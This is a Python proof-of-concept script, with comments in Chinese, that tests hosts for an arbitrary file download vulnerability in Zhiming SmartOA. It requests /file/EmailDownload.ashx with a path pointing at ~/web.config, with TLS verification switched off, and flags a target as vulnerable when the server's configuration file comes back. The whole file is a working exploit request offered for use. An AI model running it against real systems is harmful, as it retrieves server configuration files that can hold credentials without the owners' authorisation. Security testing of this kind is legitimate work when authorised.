#!/usr/bin/env python
# coding=utf-8
#智明SmartOA任意文件下载漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/file/EmailDownload.ashx?url=~/web.config&name=web.config', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = bm #设置网页编码
        if 'System.Web.Routing.IgnoreRoute' in response.text:
            print(colored('[+]存在智明SmartOA任意文件下载漏洞', 'red'))
            results = f'{urls}-->存在智明SmartOA任意文件下载漏洞'
        else:
            print('[-]不存在智明SmartOA任意文件下载漏洞')
    except:
        print('[-]不存在智明SmartOA任意文件下载漏洞')


def zhimingOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results